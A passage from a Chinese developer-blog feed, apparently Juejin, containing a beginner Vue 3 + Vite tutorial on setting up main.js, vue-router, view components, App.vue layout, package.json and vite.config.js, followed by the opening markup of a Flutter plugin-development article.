  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>作用：浏览器加载此文件，<code>main.js</code> 在这里被执行，Vue 应用会挂载到 <code>div#app</code> 上。</p>
<hr/>
<h3 data-id="heading-3">2、 <code>src/main.js</code>（应用入口，创建并挂载 Vue 应用）</h3>
<p>把 <code>src/main.js</code> 改为下面内容（或确认与之相似）：</p>
<pre><code class="hljs language-javaScript" lang="javaScript"><span class="hljs-comment">// src/main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span> <span class="hljs-comment">// 引入路由</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
app.<span class="hljs-title function_">use</span>(router)              <span class="hljs-comment">// 注册路由（重要）</span>
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)           <span class="hljs-comment">// 挂载到 index.html 的 div#app</span>
</code></pre>
<p>解释：<code>createApp(App)</code> 创建 Vue 应用实例，<code>app.use(router)</code> 把路由系统安装到应用，最后 <code>mount('#app')</code> 把应用渲染到 <code>index.html</code> 的挂载点。</p>
<hr/>
<h3 data-id="heading-4">3、 <code>src/router/index.js</code>（路由定义）</h3>
<p>如果你在创建项目时选择了 Router，已经存在路由文件。这里创建一个最简单的路由文件，包含两个页面（Home / About）：</p>
<pre><code class="hljs language-javaScript" lang="javaScript"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/Home.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/About.vue'</span>

<span class="hljs-comment">// 路由表</span>
<span class="hljs-keyword">const</span> routes = [
  { <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span> },
  { <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span> }
]

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(), <span class="hljs-comment">// 使用 HTML5 history 模式</span>
  routes
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<p>解释：每个路由项里 <code>path</code> 是 URL，<code>component</code> 是该 URL 对应渲染的 Vue 组件。</p>
<hr/>
<h3 data-id="heading-5">4、 创建视图页面（views）</h3>
<p>在 <code>src/views/</code> 下创建两个文件：<code>Home.vue</code> 和 <code>About.vue</code>。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/views/Home.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page home"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>欢迎来到首页！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/views/About.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page about"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是关于页。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">5、 <code>App.vue</code>（根组件，增加简单布局与路由出口）</h3>
<p>现在把 <code>App.vue</code> 改为一个带顶部导航与侧边栏的最简单布局，并在中间放置 <code>router-view</code>（路由的渲染位置）：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topbar"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo"</span>&gt;</span>My Vue App<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topnav"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 使用 router-link 进行页面跳转 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sidebar"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>侧栏：首页<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>侧栏：关于<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 路由内容会渲染到这里 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'App'</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 基本样式，仅做布局示例 */</span>
<span class="hljs-selector-tag">body</span>, <span class="hljs-selector-tag">html</span>, <span class="hljs-selector-id">#app</span> { <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>; <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">font-family</span>: Arial, sans-serif; }
<span class="hljs-selector-class">.topbar</span> { <span class="hljs-attribute">height</span>: <span class="hljs-number">56px</span>; <span class="hljs-attribute">background</span>:<span class="hljs-number">#35495e</span>; <span class="hljs-attribute">color</span>: white; <span class="hljs-attribute">display</span>:flex; <span class="hljs-attribute">align-items</span>:center; <span class="hljs-attribute">justify-content</span>:space-between; <span class="hljs-attribute">padding</span>:<span class="hljs-number">0</span> <span class="hljs-number">16px</span>; }
<span class="hljs-selector-class">.logo</span> { <span class="hljs-attribute">margin</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">font-size</span>:<span class="hljs-number">18px</span>; }
<span class="hljs-selector-class">.topnav</span> <span class="hljs-selector-tag">a</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#dbe9ff</span>; <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">12px</span>; <span class="hljs-attribute">text-decoration</span>:none; }
<span class="hljs-selector-class">.container</span> { <span class="hljs-attribute">display</span>: flex; <span class="hljs-attribute">height</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vh</span> - <span class="hljs-number">56px</span>); }
<span class="hljs-selector-class">.sidebar</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#f5f7fa</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>; <span class="hljs-attribute">box-shadow</span>: inset -<span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.05</span>); }
<span class="hljs-selector-class">.main</span> { <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>; }
<span class="hljs-selector-class">.sidebar</span> <span class="hljs-selector-tag">ul</span> { <span class="hljs-attribute">list-style</span>:none; <span class="hljs-attribute">padding</span>:<span class="hljs-number">0</span>; }
<span class="hljs-selector-class">.sidebar</span> <span class="hljs-selector-tag">li</span> { <span class="hljs-attribute">margin</span>:<span class="hljs-number">8px</span> <span class="hljs-number">0</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>解释要点：</p>
<ul>
<li><code>router-link</code> 替代 <code>&lt;a&gt;</code>，它会做前端路由跳转（无页面刷新）。</li>
<li><code>router-view</code> 是路由出口 —— 当前匹配的页面组件会被渲染到这里。</li>
<li>我做了简单的 <strong>header + sidebar + main</strong> 布局，帮助你理解常见的后台布局结构。</li>
</ul>
<hr/>
<h3 data-id="heading-7">6、 package.json</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-vue-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^20.19.0 || &gt;=22.12.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:prod"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build --mode production"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:analyze"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build --analyze"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:report"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build &amp;&amp; npx vite-bundle-analyzer dist"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.13.2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"echarts"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"element-plus"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.11.7"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"pinia"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.0.3"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.5.22"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vue-router"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.6.3"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@vitejs/plugin-vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.1"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^7.1.11"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite-plugin-vue-devtools"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.0.3"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>主要配置项目名称，定义项目所需框架、版本信息等,我这里主要引入下面这些组件:<br/>
<code>vue</code>：3.5.2<br/>
<code>element-plus</code>：基于vue的UI框架<br/>
<code>axios</code>：主要负责网络请求<br/>
<code>echarts</code>：图表展示框架</p>
<h3 data-id="heading-8">7、 vite.config.js</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode, command }</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">vue</span>()],
        <span class="hljs-attr">resolve</span>: {
            <span class="hljs-attr">alias</span>: {
                <span class="hljs-string">'@'</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))
            },
        },
        <span class="hljs-attr">server</span>: {
            <span class="hljs-attr">port</span>: <span class="hljs-number">5173</span>, <span class="hljs-comment">// 设置开发服务器端口</span>
            <span class="hljs-attr">host</span>: <span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-comment">// 允许外部访问</span>
            <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 启动时自动打开浏览器</span>
            <span class="hljs-attr">proxy</span>: {}
        }
    }
})
</code></pre>
<p>定义本地启动端口等相关信息，打包方式等！</p>
<h3 data-id="heading-9">8、 运行并查看效果</h3>
<pre><code class="hljs language-bash" lang="bash">    npm run dev
</code></pre>
<p>打开浏览器访问终端给出的地址（通常 <code>http://localhost:5173</code>），同时我们也可以在<code>vite.config.js</code>中修改端口。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbffc2d0885c49949f018193a11e5791~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NTU1OTcwMDI1MTA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510656&amp;x-signature=ftmqaZKpG4aK%2Bg4PFReNDqIp5gw%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10">三、.vue文件结构</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/views/AboutView.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-11">1. <code>&lt;template&gt;</code> 组件的 HTML 结构（UI）</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page about"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是基础设置页面。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p><strong>作用：</strong><br/>
定义组件渲染到页面上的实际 DOM 内容。</p>
<p><strong>特点：</strong></p>
<ul>
<li>必须有一个根节点（比如 <code>&lt;div&gt;</code>）。</li>
<li>可以写正常 HTML、Vue 模板语法（v-if、v-for、绑定等）。</li>
</ul>
<hr/>
<h3 data-id="heading-12">2. <code>&lt;script&gt;</code> 组件的逻辑（JS 代码)</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'BaseSetting'</span>,
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>作用：</strong></p>
<ul>
<li>导出当前组件的对象（类似 class）</li>
<li>定义组件名称、数据、方法、生命周期等</li>
</ul>
<p><strong>常见写法：</strong></p>
<h4 data-id="heading-13">🔹 传统 Options API</h4>
<pre><code class="hljs language-html" lang="html">export default {
  name: 'BaseSetting',
  data() { return {} },
  methods: {},
  mounted() {},
}
</code></pre>
<h4 data-id="heading-14">🔹 Composition API（更推荐）</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">3. <code>&lt;style&gt;</code> 组件的样式（CSS）</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>作用：</strong></p>
<p>给当前组件写样式。</p>
<p><code>scoped</code> 的意思：<br/>
<strong>样式只对当前组件生效，不会影响其他页面。</strong></p>
<hr/>
<p>🌱 下一步计划：学习 vue框架的基本语法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《Flutter全栈开发实战指南：从零到高级》- 22 -插件开发与原生交互]]></title>    <link>https://juejin.cn/post/7579904059525791770</link>    <guid>https://juejin.cn/post/7579904059525791770</guid>    <pubDate>2025-12-05T03:20:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579904059525791770" data-draft-id="7579904059525759002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《Flutter全栈开发实战指南：从零到高级》- 22 -插件开发与原生交互"/> <meta itemprop="keywords" content="Flutter,Android,iOS"/> <meta itemprop="datePublished" content="2025-12-05T03:20:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeap丶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《Flutter全栈开发实战指南：从零到高级》- 22 -插件开发与原生交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeap丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:20:42.000Z" title="Fri Dec 05 2025 03:20:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 